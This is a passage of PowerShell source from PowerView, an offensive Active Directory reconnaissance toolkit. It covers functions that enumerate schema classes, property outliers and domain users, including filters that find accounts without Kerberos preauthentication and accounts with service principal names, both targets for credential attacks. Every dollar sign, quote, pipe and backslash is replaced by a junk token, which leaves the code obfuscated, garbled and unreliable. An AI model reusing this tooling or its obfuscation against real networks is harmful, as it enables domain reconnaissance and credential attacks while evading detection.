Returns all domain schema classes for the current forest.

.EXAMPLE

Get-ForestSchemaClass -Forest dev.testlab.local

Returns all domain schema classes for the external.local forest.

.EXAMPLE

Get-ForestSchemaClass -ClassName user -Forest external.local

Returns the user schema class for the external.local domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-ForestSchemaClass -ClassName user -Forest external.local -Credential RaUCred

Returns the user schema class for the external.local domain using
the specified alternate credentials.

.OUTPUTS

[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]

An ActiveDirectorySchemaClass returned from the found schema.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue)]
        [Alias(q4gUClassq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUClassName,

        [Alias(q4gUNameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUForest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        RaUArguments = @{}
        if (RaUPSBoundParameters[q4gUForestq4gU]) { RaUArguments[q4gUForestq4gU] = RaUForest }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUForestObject = Get-Forest @Arguments

        if (RaUForestObject) {
            if (RaUPSBoundParameters[q4gUClassNameq4gU]) {
                ForEach (RaUTargetClass in RaUClassName) {
                    RaUForestObject.Schema.FindClass(RaUTargetClass)
                }
            }
            else {
                RaUForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {
<#
.SYNOPSIS

Finds user/group/computer objects in AD that have q4gUoutlierq4gU properties set.

Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser, Get-DomainGroup, Get-DomainComputer

.DESCRIPTION

A q4gUreferenceq4gU set of property names is calculated, either from a standard set preserved
for user/group/computers, or from the array of names passed to -ReferencePropertySet, or
from the property names of the passed -ReferenceObject. Every user/group/computer object
(depending on determined class) are enumerated, and for each object, if the object has a
q4gUnon-standardq4gU property set (meaning a property not held by the reference set), the objectq4gUs
samAccountName, property name, and property value are output to the pipeline.

.PARAMETER ClassName

Specifies the AD object class to find property outliers for, q4gUuserq4gU, q4gUgroupq4gU, or q4gUcomputerq4gU.
If -ReferenceObject is specified, this will be automatically extracted, if possible.

.PARAMETER ReferencePropertySet

Specifies an array of property names to diff against the class schema.

.PARAMETER ReferenceObject

Specicifes the PowerView user/group/computer object to extract property names
from to use as the reference set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName q4gUUserq4gU

Enumerates users in the current domain with q4gUoutlierq4gU properties filled in.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName q4gUGroupq4gU -Domain external.local

Enumerates groups in the external.local forest/domain with q4gUoutlierq4gU properties filled in.

.EXAMPLE

Get-DomainComputer -FindOne wZ5t Find-DomainObjectPropertyOutlier

Enumerates computers in the current domain with q4gUoutlierq4gU properties filled in.

.OUTPUTS

PowerView.PropertyOutlier

Custom PSObject with translated object property outliers.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.PropertyOutlierq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUClassNameq4gU)]
    Param(
        [Parameter(Position = 0, Mandatory = RaUTrue, ParameterSetName = q4gUClassNameq4gU)]
        [Alias(q4gUClassq4gU)]
        [ValidateSet(q4gUUserq4gU, q4gUGroupq4gU, q4gUComputerq4gU)]
        [String]
        RaUClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUReferencePropertySet,

        [Parameter(ValueFromPipeline = RaUTrue, Mandatory = RaUTrue, ParameterSetName = q4gUReferenceObjectq4gU)]
        [PSCustomObject]
        RaUReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUUserReferencePropertySet = @(q4gUadmincountq4gU,q4gUaccountexpiresq4gU,q4gUbadpasswordtimeq4gU,q4gUbadpwdcountq4gU,q4gUcnq4gU,q4gUcodepageq4gU,q4gUcountrycodeq4gU,q4gUdescriptionq4gU, q4gUdisplaynameq4gU,q4gUdistinguishednameq4gU,q4gUdscorepropagationdataq4gU,q4gUgivennameq4gU,q4gUinstancetypeq4gU,q4gUiscriticalsystemobjectq4gU,q4gUlastlogoffq4gU,q4gUlastlogonq4gU,q4gUlastlogontimestampq4gU,q4gUlockouttimeq4gU,q4gUlogoncountq4gU,q4gUmemberofq4gU,q4gUmsds-supportedencryptiontypesq4gU,q4gUnameq4gU,q4gUobjectcategoryq4gU,q4gUobjectclassq4gU,q4gUobjectguidq4gU,q4gUobjectsidq4gU,q4gUprimarygroupidq4gU,q4gUpwdlastsetq4gU,q4gUsamaccountnameq4gU,q4gUsamaccounttypeq4gU,q4gUsnq4gU,q4gUuseraccountcontrolq4gU,q4gUuserprincipalnameq4gU,q4gUusnchangedq4gU,q4gUusncreatedq4gU,q4gUwhenchangedq4gU,q4gUwhencreatedq4gU)

        RaUGroupReferencePropertySet = @(q4gUadmincountq4gU,q4gUcnq4gU,q4gUdescriptionq4gU,q4gUdistinguishednameq4gU,q4gUdscorepropagationdataq4gU,q4gUgrouptypeq4gU,q4gUinstancetypeq4gU,q4gUiscriticalsystemobjectq4gU,q4gUmemberq4gU,q4gUmemberofq4gU,q4gUnameq4gU,q4gUobjectcategoryq4gU,q4gUobjectclassq4gU,q4gUobjectguidq4gU,q4gUobjectsidq4gU,q4gUsamaccountnameq4gU,q4gUsamaccounttypeq4gU,q4gUsystemflagsq4gU,q4gUusnchangedq4gU,q4gUusncreatedq4gU,q4gUwhenchangedq4gU,q4gUwhencreatedq4gU)

        RaUComputerReferencePropertySet = @(q4gUaccountexpiresq4gU,q4gUbadpasswordtimeq4gU,q4gUbadpwdcountq4gU,q4gUcnq4gU,q4gUcodepageq4gU,q4gUcountrycodeq4gU,q4gUdistinguishednameq4gU,q4gUdnshostnameq4gU,q4gUdscorepropagationdataq4gU,q4gUinstancetypeq4gU,q4gUiscriticalsystemobjectq4gU,q4gUlastlogoffq4gU,q4gUlastlogonq4gU,q4gUlastlogontimestampq4gU,q4gUlocalpolicyflagsq4gU,q4gUlogoncountq4gU,q4gUmsds-supportedencryptiontypesq4gU,q4gUnameq4gU,q4gUobjectcategoryq4gU,q4gUobjectclassq4gU,q4gUobjectguidq4gU,q4gUobjectsidq4gU,q4gUoperatingsystemq4gU,q4gUoperatingsystemservicepackq4gU,q4gUoperatingsystemversionq4gU,q4gUprimarygroupidq4gU,q4gUpwdlastsetq4gU,q4gUsamaccountnameq4gU,q4gUsamaccounttypeq4gU,q4gUserviceprincipalnameq4gU,q4gUuseraccountcontrolq4gU,q4gUusnchangedq4gU,q4gUusncreatedq4gU,q4gUwhenchangedq4gU,q4gUwhencreatedq4gU)

        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUSearcherArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }

        # Domain / Credential
        if (RaUPSBoundParameters[q4gUDomainq4gU]) {
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                RaUTargetForest = Get-Domain -Domain RaUDomain wZ5t Select-Object -ExpandProperty Forest wZ5t Select-Object -ExpandProperty Name
            }
            else {
                RaUTargetForest = Get-Domain -Domain RaUDomain -Credential RaUCredential wZ5t Select-Object -ExpandProperty Forest wZ5t Select-Object -ExpandProperty Name
            }
            Write-Verbose Oj8X[Find-DomainObjectPropertyOutlier] Enumerated forest q4gURaUTargetForestq4gU for target domain q4gURaUDomainq4gUOj8X
        }

        RaUSchemaArguments = @{}
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSchemaArguments[q4gUCredentialq4gU] = RaUCredential }
        if (RaUTargetForest) {
            RaUSchemaArguments[q4gUForestq4gU] = RaUTargetForest
        }
    }

    PROCESS {

        if (RaUPSBoundParameters[q4gUReferencePropertySetq4gU]) {
            Write-Verbose Oj8X[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySetOj8X
            RaUReferenceObjectProperties = RaUReferencePropertySet
        }
        elseif (RaUPSBoundParameters[q4gUReferenceObjectq4gU]) {
            Write-Verbose Oj8X[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property setOj8X
            RaUReferenceObjectProperties = Get-Member -InputObject RaUReferenceObject -MemberType NoteProperty wZ5t Select-Object -Expand Name
            RaUReferenceObjectClass = RaUReferenceObject.objectclass wZ5t Select-Object -Last 1
            Write-Verbose Oj8X[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : RaUReferenceObjectClassOj8X
        }
        else {
            Write-Verbose Oj8X[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class q4gURaUClassNameq4gUOj8X
        }

        if ((RaUClassName -eq q4gUUserq4gU) -or (RaUReferenceObjectClass -eq q4gUUserq4gU)) {
            RaUObjects = Get-DomainUser @SearcherArguments
            if (-not RaUReferenceObjectProperties) {
                RaUReferenceObjectProperties = RaUUserReferencePropertySet
            }
        }
        elseif ((RaUClassName -eq q4gUGroupq4gU) -or (RaUReferenceObjectClass -eq q4gUGroupq4gU)) {
            RaUObjects = Get-DomainGroup @SearcherArguments
            if (-not RaUReferenceObjectProperties) {
                RaUReferenceObjectProperties = RaUGroupReferencePropertySet
            }
        }
        elseif ((RaUClassName -eq q4gUComputerq4gU) -or (RaUReferenceObjectClass -eq q4gUComputerq4gU)) {
            RaUObjects = Get-DomainComputer @SearcherArguments
            if (-not RaUReferenceObjectProperties) {
                RaUReferenceObjectProperties = RaUComputerReferencePropertySet
            }
        }
        else {
            throw Oj8X[Find-DomainObjectPropertyOutlier] Invalid class: RaUClassNameOj8X
        }

        ForEach (RaUObject in RaUObjects) {
            RaUObjectProperties = Get-Member -InputObject RaUObject -MemberType NoteProperty wZ5t Select-Object -Expand Name
            ForEach(RaUObjectProperty in RaUObjectProperties) {
                if (RaUReferenceObjectProperties -NotContains RaUObjectProperty) {
                    RaUOut = New-Object PSObject
                    RaUOut wZ5t Add-Member Noteproperty q4gUSamAccountNameq4gU RaUObject.SamAccountName
                    RaUOut wZ5t Add-Member Noteproperty q4gUPropertyq4gU RaUObjectProperty
                    RaUOut wZ5t Add-Member Noteproperty q4gUValueq4gU RaUObject.RaUObjectProperty
                    RaUOut.PSObject.TypeNames.Insert(0, q4gUPowerView.PropertyOutlierq4gU)
                    RaUOut
                }
            }
        }
    }
}


########################################################
#
# Oj8Xnet *Oj8X replacements and other fun start below
#
########################################################

function Get-DomainUser {
<#
.SYNOPSIS

Return all users or specific user objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Oj8X-Properties samaccountname,usnchanged,...Oj8X. By default, all user objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted. Also accepts DOMAINScKjuser format.

.PARAMETER SPN

Switch. Only return user objects with non-null service principal names.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from RaUUACEnum, including
Oj8XNOT_XOj8X negation forms. To see all possible values, run q4gU0wZ5tConvertFrom-UACValue -ShowAllq4gU.

.PARAMETER AdminCount

Switch. Return users with q4gU(adminCount=1)q4gU (meaning are/were privileged).

.PARAMETER AllowDelegation

Switch. Return user accounts that are not marked as q4gUsensitive and not allowed for delegationq4gU

.PARAMETER DisallowDelegation

Switch. Return user accounts that are marked as q4gUsensitive and not allowed for delegationq4gU

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER PreauthNotRequired

Switch. Return user accounts with Oj8XDo not require Kerberos preauthenticationOj8X set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainUser -Domain testlab.local

Return all users for the testlab.local domain

.EXAMPLE

Get-DomainUser Oj8XS-1-5-21-890171859-3433809279-3366196753-1108Oj8X,Oj8XadministratorOj8X

Return the user with the given SID, as well as Administrator.

.EXAMPLE

q4gUS-1-5-21-890171859-3433809279-3366196753-1114q4gU, q4gUCN=dfm,CN=Users,DC=testlab,DC=localq4gU,q4gU4c435dd7-dc58-4b14-9a5e-1fdb0e80d201q4gU,q4gUadministratorq4gU wZ5t Get-DomainUser -Properties samaccountname,lastlogoff

lastlogoff                                   samaccountname
----------                                   --------------
12/31/1600 4:00:00 PM                        dfm.a
12/31/1600 4:00:00 PM                        dfm
12/31/1600 4:00:00 PM                        harmj0y
12/31/1600 4:00:00 PM                        Administrator

.EXAMPLE

Get-DomainUser -SearchBase Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X -AdminCount -AllowDelegation

Search the specified OU for privileged user (AdminCount = 1) that allow delegation

.EXAMPLE

Get-DomainUser -LDAPFilter q4gU(!primarygroupid=513)q4gU -Properties samaccountname,lastlogon

Search for users with a primary group ID other than 513 (q4gUdomain usersq4gU) and only return samaccountname and lastlogon

.EXAMPLE

Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED

Find users who doesnq4gUt require Kerberos preauthentication and DONq4gUT have an expired password.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainUser -Credential RaUCred

.EXAMPLE

Get-Domain wZ5t Select-Object -Expand name
testlab.local

Get-DomainUser devScKjuser1 -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(wZ5t(samAccountName=user1)))

distinguishedname
-----------------
CN=user1,CN=Users,DC=dev,DC=testlab,DC=local

.INPUTS

String

.OUTPUTS

PowerView.User

Custom PSObject with translated user property fields.

PowerView.User.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSUseDeclaredVarsMoreThanAssignmentsq4gU, q4gUq4gU)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.Userq4gU)]
    [OutputType(q4gUPowerView.User.Rawq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUAllowDelegationq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUDistinguishedNameq4gU, q4gUSamAccountNameq4gU, q4gUNameq4gU, q4gUMemberDistinguishedNameq4gU, q4gUMemberNameq4gU)]
        [String[]]
        RaUIdentity,

        [Switch]
        RaUSPN,

        [Switch]
        RaUAdminCount,

        [Parameter(ParameterSetName = q4gUAllowDelegationq4gU)]
        [Switch]
        RaUAllowDelegation,

        [Parameter(ParameterSetName = q4gUDisallowDelegationq4gU)]
        [Switch]
        RaUDisallowDelegation,

        [Switch]
        RaUTrustedToAuth,

        [Alias(q4gUKerberosPreauthNotRequiredq4gU, q4gUNoPreauthq4gU)]
        [Switch]
        RaUPreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        RaURaw
    )

    DynamicParam {
        RaUUACValueNames = [Enum]::GetNames(RaUUACEnum)
        # add in the negations
        RaUUACValueNames = RaUUACValueNames wZ5t ForEach-Object {RaU_; Oj8XNOT_RaU_Oj8X}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet RaUUACValueNames -Type ([array])
    }

    BEGIN {
        RaUSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        RaUUserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if (RaUPSBoundParameters -and (RaUPSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters RaUPSBoundParameters
        }

        if (RaUUserSearcher) {
            RaUIdentityFilter = q4gUq4gU
            RaUFilter = q4gUq4gU
            RaUIdentity wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                RaUIdentityInstance = RaU_.Replace(q4gU(q4gU, q4gUScKj28q4gU).Replace(q4gU)q4gU, q4gUScKj29q4gU)
                if (RaUIdentityInstance -match q4gU^S-1-q4gU) {
                    RaUIdentityFilter += Oj8X(objectsid=RaUIdentityInstance)Oj8X
                }
                elseif (RaUIdentityInstance -match q4gU^CN=q4gU) {
                    RaUIdentityFilter += Oj8X(distinguishedname=RaUIdentityInstance)Oj8X
                    if ((-not RaUPSBoundParameters[q4gUDomainq4gU]) -and (-not RaUPSBoundParameters[q4gUSearchBaseq4gU])) {
                        # if a -Domain isnq4gUt explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        RaUIdentityDomain = RaUIdentityInstance.SubString(RaUIdentityInstance.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                        Write-Verbose Oj8X[Get-DomainUser] Extracted domain q4gURaUIdentityDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                        RaUSearcherArguments[q4gUDomainq4gU] = RaUIdentityDomain
                        RaUUserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not RaUUserSearcher) {
                            Write-Warning Oj8X[Get-DomainUser] Unable to retrieve domain searcher for q4gURaUIdentityDomainq4gUOj8X
                        }
                    }
                }
                elseif (RaUIdentityInstance -imatch q4gU^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}RaUq4gU) {
                    RaUGuidByteString = (([Guid]RaUIdentityInstance).ToByteArray() wZ5t ForEach-Object { q4gUScKjq4gU + RaU_.ToString(q4gUX2q4gU) }) -join q4gUq4gU
                    RaUIdentityFilter += Oj8X(objectguid=RaUGuidByteString)Oj8X
                }
                elseif (RaUIdentityInstance.Contains(q4gUScKjq4gU)) {
                    RaUConvertedIdentityInstance = RaUIdentityInstance.Replace(q4gUScKj28q4gU, q4gU(q4gU).Replace(q4gUScKj29q4gU, q4gU)q4gU) wZ5t Convert-ADName -OutputType Canonical
                    if (RaUConvertedIdentityInstance) {
                        RaUUserDomain = RaUConvertedIdentityInstance.SubString(0, RaUConvertedIdentityInstance.IndexOf(q4gU/q4gU))
                        RaUUserName = RaUIdentityInstance.Split(q4gUScKjq4gU)[1]
                        RaUIdentityFilter += Oj8X(samAccountName=RaUUserName)Oj8X
                        RaUSearcherArguments[q4gUDomainq4gU] = RaUUserDomain
                        Write-Verbose Oj8X[Get-DomainUser] Extracted domain q4gURaUUserDomainq4gU from q4gURaUIdentityInstanceq4gUOj8X
                        RaUUserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    RaUIdentityFilter += Oj8X(samAccountName=RaUIdentityInstance)Oj8X
                }
            }

            if (RaUIdentityFilter -and (RaUIdentityFilter.Trim() -ne q4gUq4gU) ) {
                RaUFilter += Oj8X(wZ5tRaUIdentityFilter)Oj8X
            }

            if (RaUPSBoundParameters[q4gUSPNq4gU]) {
                Write-Verbose q4gU[Get-DomainUser] Searching for non-null service principal namesq4gU
                RaUFilter += q4gU(servicePrincipalName=*)q4gU
            }
            if (RaUPSBoundParameters[q4gUAllowDelegationq4gU]) {
                Write-Verbose q4gU[Get-DomainUser] Searching for users who can be delegatedq4gU
                # negation of Oj8XAccounts that are sensitive and not trusted for delegationOj8X
                RaUFilter += q4gU(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))q4gU
            }
            if (RaUPSBoundParameters[q4gUDisallowDelegationq4gU]) {
                Write-Verbose q4gU[Get-DomainUser] Searching for users who are sensitive and not trusted for delegationq4gU
                RaUFilter += q4gU(userAccountControl:1.2.840.113556.1.4.803:=1048574)q4gU
            }
            if (RaUPSBoundParameters[q4gUAdminCountq4gU]) {
                Write-Verbose q4gU[Get-DomainUser] Searching for adminCount=1q4gU
                RaUFilter += q4gU(admincount=1)q4gU
            }
            if (RaUPSBoundParameters[q4gUTrustedToAuthq4gU]) {
                Write-Verbose q4gU[Get-DomainUser] Searching for users that are trusted to authenticate for other principalsq4gU
                RaUFilter += q4gU(msds-allowedtodelegateto=*)q4gU
            }
            if (RaUPSBoundParameters[q4gUPreauthNotRequiredq4gU]) {
                Write-Verbose q4gU[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticateq4gU
                RaUFilter += q4gU(userAccountControl:1.2.840.113556.1.4.803:=4194304)q4gU
            }
            if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) {
                Write-Verbose Oj8X[Get-DomainUser] Using additional LDAP filter: RaULDAPFilterOj8X
                RaUFilter += Oj8XRaULDAPFilterOj8X
            }

            # build the LDAP filter for the dynamic UAC filter value
            RaUUACFilter wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                if (RaU_ -match q4gUNOT_.*q4gU) {
                    RaUUACField = RaU_.Substring(4)
                    RaUUACValue = [Int](RaUUACEnum::RaUUACField)
                    RaUFilter += Oj8X(!(userAccountControl:1.2.840.113556.1.4.803:=RaUUACValue))Oj8X
                }
                else {
                    RaUUACValue = [Int](RaUUACEnum::RaU_)
                    RaUFilter += Oj8X(userAccountControl:1.2.840.113556.1.4.803:=RaUUACValue)Oj8X
                }
            }

            RaUUserSearcher.filter = Oj8X(&(samAccountType=805306368)RaUFilter)Oj8X
            Write-Verbose Oj8X[Get-DomainUser] filter string: RaU(RaUUserSearcher.filter)Oj8X

            if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUUserSearcher.FindOne() }
            else { RaUResults = RaUUserSearcher.FindAll() }
            RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                if (RaUPSBoundParameters[q4gURawq4gU]) {
                    # return raw result objects
                    RaUUser = RaU_
                    RaUUser.PSObject.TypeNames.Insert(0, q4gUPowerView.User.Rawq4gU)
                }
                else {
                    RaUUser = Convert-LDAPProperty -Properties RaU_.Properties
                    RaUUser.PSObject.TypeNames.Insert(0, q4gUPowerView.Userq4gU)
                }
                RaUUser
            }
            if (RaUResults) {
                try { RaUResults.dispose() }
                catch {
                    Write-Verbose Oj8X[Get-DomainUser] Error disposing of the Results object: RaU_Oj8X
                }
            }
            RaUUserSearcher.dispose()
        }
    }
}


function New-DomainUser {
<#
.SYNOPSIS

Creates a new domain user (assuming appropriate permissions) and returns the user object.

TODO: implement all properties that New-ADUser implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

